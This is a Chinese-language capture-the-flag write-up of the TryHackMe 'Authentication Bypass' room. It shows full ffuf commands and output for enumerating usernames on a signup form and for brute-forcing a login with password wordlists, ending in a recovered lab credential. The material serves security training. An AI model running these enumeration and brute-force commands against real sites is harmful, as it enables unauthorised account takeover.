> https://tryhackme.com/room/authenticationbypass
> Writeup：[Authentication Bypass -TryHackMe](https://infosecwriteups.com/authentication-bypass-tryhackme-115039117a5d)
> #Offensive #Web-Hacking 

# Task 1 Brief

前置介绍
> 在这个房间里，我们将了解绕过、击败或破坏网站身份验证方法的不同方式。

# Task 2 Username Enumeration

介绍了使用字典进行扫描，扫描出有效的用户名
```shell
┌──(randark㉿kali)-[~]
└─$ ffuf -w wordlists/SecLists/Usernames/Names/names.txt -X POST \
-d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u "http://10.10.176.198/customers/signup" \
-mr "username already exists"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.176.198/customers/signup
 :: Wordlist         : FUZZ: wordlists/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 250ms]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 251ms]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 250ms]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 251ms]
:: Progress: [10177/10177] :: Job [1/1] :: 157 req/sec :: Duration: [0:01:05] :: Errors: 0 ::
```

# Task 3 Brute Force

使用双字典，爆破检测有效的用户名/密码的组合
```shell
┌──(randark㉿kali)-[~]
└─$ ffuf -w valid_usernames.txt:W1,./wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
-X POST \
-d "username=W1&password=W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u "http://10.10.176.198/customers/login" \
-fc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.176.198/customers/login
 :: Wordlist         : W1: valid_usernames.txt
 :: Wordlist         : W2: ./wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=W1&password=W2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 264ms]
    * W2: thunder
    * W1: steve

:: Progress: [404/404] :: Job [1/1] :: 158 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

# Task 4 Logic Flaw

简单地一个逻辑漏洞，用Burp Suite操作的话会更直观

# Task 5 Cookie Tampering

介绍了Cookie在网站鉴权中的应用，以及[https://crackstation.net/](https://crackstation.net/) 用以彩虹表反查哈希